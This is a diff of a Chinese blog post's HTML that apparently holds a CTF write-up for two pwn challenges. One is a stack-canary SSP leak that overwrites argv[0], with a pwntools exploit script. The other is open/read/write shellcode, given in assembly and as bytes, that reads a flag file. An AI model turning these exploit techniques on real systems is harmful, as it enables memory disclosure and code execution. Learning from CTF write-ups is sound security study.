@@ -6,18 +6,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。 先来看一下函数___stack_chk_fail源码： void __attribute__">
+    <meta name="description" content="Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。 先来看一下函数___stack_chk_fail源码： 1234567891011void">
 <meta name="keywords" content="pwn,canary,shellcode">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Syc Geek 10th">
 <meta property="og:url" content="http://suvii22.github.io/2019/11/04/Syc-Geek-10th/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
-<meta property="og:description" content="Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。 先来看一下函数___stack_chk_fail源码： void __attribute__">
+<meta property="og:description" content="Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。 先来看一下函数___stack_chk_fail源码： 1234567891011void">
 <meta property="og:locale" content="en">
 <meta property="og:updated_time" content="2020-09-01T11:47:59.874Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Syc Geek 10th">
-<meta name="twitter:description" content="Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。 先来看一下函数___stack_chk_fail源码： void __attribute__">
+<meta name="twitter:description" content="Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。 先来看一下函数___stack_chk_fail源码： 1234567891011void">
     
     
         
@@ -47,7 +47,7 @@
     <!-- rss -->
     
     
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -157,134 +157,39 @@
   <div class="content" itemprop="articleBody">
     <h2 id="Baby-canary"><a href="#Baby-canary" class="headerlink" title="Baby canary"></a>Baby canary</h2><h3 id="ssp"><a href="#ssp" class="headerlink" title="ssp"></a>ssp</h3><p>如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 <code>___stack_chk_fail</code> 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数<code>___stack_chk_fail</code>产生的。</p>
 <p>先来看一下函数___stack_chk_fail源码：</p>
-<pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
-{
-  __fortify_fail (&quot;stack smashing detected&quot;);
-}
-void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
-{
-  /* The loop is added only to keep gcc happy.  */
-  while (1)
-    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,
-                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
-}</code></pre><p><code>__libc_argv[0]</code>里面装的是应用程序的路径，当canary出错报错输出中会打印出来，那如果我们在栈溢出时将它覆盖掉，那打印出来的会是什么呢？会打印我们所覆盖的相应的指针内容。所有在没有劫持到相应权限时，这个特点可以用来泄露内存中的内容。</p>
-<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><pre><code>gdb-peda$ checksec canary2
-CANARY    : ENABLED
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : disabled
-RELRO     : Partial</code></pre><p>发现程序开了NX和CANARY<br>在IDA看一下：</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  void *buf; // ST08_8
-  int fd; // [rsp+4h] [rbp-2Ch]
-  char v6; // [rsp+10h] [rbp-20h]
-  unsigned __int64 v7; // [rsp+28h] [rbp-8h]
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">__attribute__</span> <span class="params">((noreturn)</span>) <span class="title">__stack_chk_fail</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">__attribute__</span> <span class="params">((noreturn)</span>) internal_function <span class="title">__fortify_fail</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminatedn"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  v7 = __readfsqword(0x28u);
-  init();
-  fd = open(&quot;flag&quot;, 0);
-  if ( fd &lt; 0 )
-  {
-    printf(&quot;Not find flag, Wrong!&quot;);
-    exit(0);
-  }
-  buf = malloc(0x20uLL);
-  read(fd, buf, 0x10uLL);
-  puts(&quot;Rop is easy for U, try bypass the check!&quot;);
-  printf(&quot;Here is your key: %p\n&quot;, buf);
-  puts(&quot;Say something before leaving.&quot;);
-  gets((__int64)&amp;v6);
-  printf(&quot;I hava received your message, bye!&quot;);
-  return 0;
-}</code></pre><p>发现可以用ssp，接下来就是调试了。</p>
-<h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><pre><code>gdb-peda$ c
-Continuing.
-Rop is easy for U, try bypass the check!
-Here is your key: 0x602010
-Say something before leaving.
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-I hava received your message, bye!*** stack smashing detected ***: /home/suv11/Desktop/syc/canary2 terminated   &lt;----__libc_argv[0]</code></pre><pre><code>gdb-peda$ stack 150
-0800| 0x7fffffffdcd8 --&gt; 0x7ffff7b2615c (&lt;__GI___fortify_fail+92&gt;:    )
-0808| 0x7fffffffdce0 --&gt; 0x0 
-0816| 0x7fffffffdce8 --&gt; 0x7fffffffdd40 (&#39;a&#39; &lt;repeats 17 times&gt;)
-0824| 0x7fffffffdcf0 --&gt; 0x400750 (&lt;_start&gt;:    xor    ebp,ebp)
-0832| 0x7fffffffdcf8 --&gt; 0x7ffff7b26100 (&lt;__GI___fortify_fail&gt;:    push   r12)
-0840| 0x7fffffffdd00 --&gt; 0x1 
-0848| 0x7fffffffdd08 --&gt; 0x400967 (&lt;main+222&gt;:    leave)
-0856| 0x7fffffffdd10 --&gt; 0x3ffffdd3e 
-0864| 0x7fffffffdd18 --&gt; 0x602010 --&gt; 0xa71717171 (&#39;qqqq\n&#39;)
-0872| 0x7fffffffdd20 (&#39;a&#39; &lt;repeats 49 times&gt;)
-0880| 0x7fffffffdd28 (&#39;a&#39; &lt;repeats 41 times&gt;)
-0888| 0x7fffffffdd30 (&#39;a&#39; &lt;repeats 33 times&gt;)
-0896| 0x7fffffffdd38 (&#39;a&#39; &lt;repeats 25 times&gt;)
-0904| 0x7fffffffdd40 (&#39;a&#39; &lt;repeats 17 times&gt;)
-0912| 0x7fffffffdd48 (&quot;aaaaaaaaa&quot;)
-0920| 0x7fffffffdd50 --&gt; 0x61 (&#39;a&#39;)
-0928| 0x7fffffffdd58 --&gt; 0x7fffffffde28 --&gt; 0x7fffffffe1e5 (&quot;/home/suv11/Desktop/syc/canary2&quot;)</code></pre><p>从栈内存信息可知缓冲区v6地址为 0x7fffffffdd20， argv[0]地址为 0x7fffffffde28，从而可计算出v6与argv[0]间的偏移量为0x108（0x7fffffffde28-0x7fffffffdd20）<br>于是，我们可以覆盖argv[0]的值为flag_addr</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnto.fun'</span><span class="token punctuation">,</span><span class="token number">10007</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#p = process('./canary2')</span>
-p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Here is your key: '</span><span class="token punctuation">)</span>
-flag_addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
-addr<span class="token operator">=</span>int<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<h2 id="Baby-shellcode"><a href="#Baby-shellcode" class="headerlink" title="Baby shellcode"></a>Baby shellcode</h2><h3 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h3><pre><code>char v4; // [rsp+0h] [rbp-30h]
-  void *buf; // [rsp+28h] [rbp-8h]
+<p><code>__libc_argv[0]</code>里面装的是应用程序的路径，当canary出错报错输出中会打印出来，那如果我们在栈溢出时将它覆盖掉，那打印出来的会是什么呢？会打印我们所覆盖的相应的指针内容。所有在没有劫持到相应权限时，这个特点可以用来泄露内存中的内容。</p>
+<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec canary2</span><br><span class="line">CANARY    : <span class="type">ENABLED</span></span><br><span class="line">FORTIFY   : <span class="type">disabled</span></span><br><span class="line">NX        : <span class="type">ENABLED</span></span><br><span class="line">PIE       : <span class="type">disabled</span></span><br><span class="line">RELRO     : <span class="type">Partial</span></span><br></pre></td></tr></table></figure>
 
-  buf = mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);
-  sub_400999();
-  sub_400956();
-  puts(&quot;A simple shellcode for U, have fun!&quot;);
-  read(0, buf, 0x64uLL);
-  puts(&quot;Why not play CSGO?&quot;);
-  read(0, &amp;v4, 0x64uLL);
-  return 0LL;</code></pre><p>我们可以通过<code>read(0, buf, 0x64uLL)</code>把shellcode写到内存中，然后再通过<code>read(0, &amp;v4, 0x64uLL)</code>把返回地址覆盖为0x123000。根据本题hint只有open，read，write是可用函数，所以我们只能自己编写shellcode完成以下功能：</p>
+<p>发现程序开了NX和CANARY<br>在IDA看一下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  fd = open(<span class="string">"flag"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Not find flag, Wrong!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  read(fd, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Rop is easy for U, try bypass the check!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is your key: %p\n"</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Say something before leaving."</span>);</span><br><span class="line">  gets((__int64)&amp;v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"I hava received your message, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现可以用ssp，接下来就是调试了。</p>
+<h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Rop <span class="keyword">is</span> easy <span class="keyword">for</span> U, <span class="keyword">try</span> bypass the check!</span><br><span class="line">Here <span class="keyword">is</span> your key: <span class="number">0x602010</span></span><br><span class="line">Say something before leaving.</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">I hava received your message, bye!*** stack smashing detected ***: /home/suv11/Desktop/syc/canary2 terminated   &lt;----__libc_argv[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack <span class="number">150</span></span><br><span class="line"><span class="number">0800</span>| <span class="number">0x7fffffffdcd8</span> --&gt; <span class="number">0x7ffff7b2615c</span> (&lt;__GI___fortify_fail+<span class="number">92</span>&gt;:	)</span><br><span class="line"><span class="number">0808</span>| <span class="number">0x7fffffffdce0</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0816</span>| <span class="number">0x7fffffffdce8</span> --&gt; <span class="number">0x7fffffffdd40</span> (<span class="string">'a'</span> &lt;repeats <span class="number">17</span> times&gt;)</span><br><span class="line"><span class="number">0824</span>| <span class="number">0x7fffffffdcf0</span> --&gt; <span class="number">0x400750</span> (&lt;_start&gt;:	<span class="keyword">xor</span>    ebp,ebp)</span><br><span class="line"><span class="number">0832</span>| <span class="number">0x7fffffffdcf8</span> --&gt; <span class="number">0x7ffff7b26100</span> (&lt;__GI___fortify_fail&gt;:	push   r12)</span><br><span class="line"><span class="number">0840</span>| <span class="number">0x7fffffffdd00</span> --&gt; <span class="number">0x1</span> </span><br><span class="line"><span class="number">0848</span>| <span class="number">0x7fffffffdd08</span> --&gt; <span class="number">0x400967</span> (&lt;main+<span class="number">222</span>&gt;:	leave)</span><br><span class="line"><span class="number">0856</span>| <span class="number">0x7fffffffdd10</span> --&gt; <span class="number">0x3ffffdd3e</span> </span><br><span class="line"><span class="number">0864</span>| <span class="number">0x7fffffffdd18</span> --&gt; <span class="number">0x602010</span> --&gt; <span class="number">0xa71717171</span> (<span class="string">'qqqq\n'</span>)</span><br><span class="line"><span class="number">0872</span>| <span class="number">0x7fffffffdd20</span> (<span class="string">'a'</span> &lt;repeats <span class="number">49</span> times&gt;)</span><br><span class="line"><span class="number">0880</span>| <span class="number">0x7fffffffdd28</span> (<span class="string">'a'</span> &lt;repeats <span class="number">41</span> times&gt;)</span><br><span class="line"><span class="number">0888</span>| <span class="number">0x7fffffffdd30</span> (<span class="string">'a'</span> &lt;repeats <span class="number">33</span> times&gt;)</span><br><span class="line"><span class="number">0896</span>| <span class="number">0x7fffffffdd38</span> (<span class="string">'a'</span> &lt;repeats <span class="number">25</span> times&gt;)</span><br><span class="line"><span class="number">0904</span>| <span class="number">0x7fffffffdd40</span> (<span class="string">'a'</span> &lt;repeats <span class="number">17</span> times&gt;)</span><br><span class="line"><span class="number">0912</span>| <span class="number">0x7fffffffdd48</span> (<span class="string">"aaaaaaaaa"</span>)</span><br><span class="line"><span class="number">0920</span>| <span class="number">0x7fffffffdd50</span> --&gt; <span class="number">0x61</span> (<span class="string">'a'</span>)</span><br><span class="line"><span class="number">0928</span>| <span class="number">0x7fffffffdd58</span> --&gt; <span class="number">0x7fffffffde28</span> --&gt; <span class="number">0x7fffffffe1e5</span> (<span class="string">"/home/suv11/Desktop/syc/canary2"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>从栈内存信息可知缓冲区v6地址为 0x7fffffffdd20， argv[0]地址为 0x7fffffffde28，从而可计算出v6与argv[0]间的偏移量为0x108（0x7fffffffde28-0x7fffffffdd20）<br>于是，我们可以覆盖argv[0]的值为flag_addr</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwnto.fun'</span>,<span class="number">10007</span>)</span><br><span class="line"><span class="comment">#p = process('./canary2')</span></span><br><span class="line">p.recvuntil(<span class="string">'Here is your key: '</span>)</span><br><span class="line">flag_addr = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">addr=int(flag_addr,<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x108</span>+p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Baby-shellcode"><a href="#Baby-shellcode" class="headerlink" title="Baby shellcode"></a>Baby shellcode</h2><h3 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">char v4; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="built_in">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap((<span class="built_in">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>LL);</span><br><span class="line">  sub_400999();</span><br><span class="line">  sub_400956();</span><br><span class="line">  puts(<span class="string">"A simple shellcode for U, have fun!"</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  puts(<span class="string">"Why not play CSGO?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>LL;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过<code>read(0, buf, 0x64uLL)</code>把shellcode写到内存中，然后再通过<code>read(0, &amp;v4, 0x64uLL)</code>把返回地址覆盖为0x123000。根据本题hint只有open，read，write是可用函数，所以我们只能自己编写shellcode完成以下功能：</p>
 <ol>
 <li>push存放flag的文件名</li>
 <li>使用open函数打开文件</li>
 <li>使用read函数读取文件内容</li>
 <li>使用write函数把读取到的内容写入stdout</li>
 </ol>
-<h3 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h3><pre><code>#调用open函数
-xor rdi,rdi;       #清空rdi寄存器
-xor rsi,rsi;       #清空rsi寄存器
-mov rax,0x2;       #rax存放open函数的系统调用号
-push 0x67616c66;   #push flag
-mov rdi,rsp;       
-syscall;
+<h3 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#调用open函数</span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rdi</span>,<span class="built_in">rdi</span><span class="comment">;       #清空rdi寄存器</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rsi</span>,<span class="built_in">rsi</span><span class="comment">;       #清空rsi寄存器</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0x2</span><span class="comment">;       #rax存放open函数的系统调用号</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">0x67616c66</span><span class="comment">;   #push flag</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="built_in">rsp</span><span class="comment">;       </span></span><br><span class="line"><span class="keyword">syscall</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">#调用read函数</span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rdi</span>,<span class="built_in">rdi</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rsi</span>,<span class="built_in">rsi</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="built_in">rax</span><span class="comment">;       #rdi存放fd(open函数返回的rax)</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0x0</span><span class="comment">;       </span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>,<span class="number">0x123800</span><span class="comment">;  #rsi存放文件内容，即flag</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>,<span class="number">0x100</span><span class="comment">;     #rdx存放读取字符串的长度</span></span><br><span class="line"><span class="keyword">syscall</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">#调用write函数</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0x1</span><span class="comment">;       #rdi存放输出位置</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0x1</span><span class="comment">;      </span></span><br><span class="line"><span class="keyword">syscall</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
 
-#调用read函数
-xor rdi,rdi;
-xor rsi,rsi;
-mov rdi,rax;       #rdi存放fd(open函数返回的rax)
-mov rax,0x0;       
-mov rsi,0x123800;  #rsi存放文件内容，即flag
-mov rdx,0x100;     #rdx存放读取字符串的长度
-syscall;
+<p>然后编译运行，得到shellcode</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$ nasm -f elf64 a.asm -g -F stabs -o a.o</span></span><br><span class="line"><span class="formula">$</span> for i in <span class="formula">$(objdump -d a.o | grep "^ " | cut -f2); do echo -n '<span class="tag">\<span class="name">x</span></span>'$</span>i; done; echo</span><br><span class="line"><span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xf</span></span>6<span class="tag">\<span class="name">xb</span></span>8<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>66<span class="tag">\<span class="name">x</span></span>6c<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>67<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xe</span></span>7<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xf</span></span>6<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>89<span class="tag">\<span class="name">xc</span></span>7<span class="tag">\<span class="name">xb</span></span>8<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">xbe</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>38<span class="tag">\<span class="name">x</span></span>12<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">xba</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">xbf</span></span><span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">xb</span></span>8<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>05</span><br></pre></td></tr></table></figure>
 
-#调用write函数
-mov rdi,0x1;       #rdi存放输出位置
-mov rax,0x1;      
-syscall;</code></pre><p>然后编译运行，得到shellcode</p>
-<pre><code>$ nasm -f elf64 a.asm -g -F stabs -o a.o
-$ for i in $(objdump -d a.o | grep &quot;^ &quot; | cut -f2); do echo -n &#39;\x&#39;$i; done; echo
-\x48\x31\xff\x48\x31\xf6\xb8\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x0f\x05\x48\x31\xff\x48\x31\xf6\x48\x89\xc7\xb8\x00\x00\x00\x00\xbe\x00\x38\x12\x00\xba\x00\x01\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05</code></pre><p>注：<br><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">64位Linux系统调用表</a><br><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">32位Linux系统调用表</a></p>
-<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<p>注：<br><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">64位Linux系统调用表</a><br><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">32位Linux系统调用表</a></p>
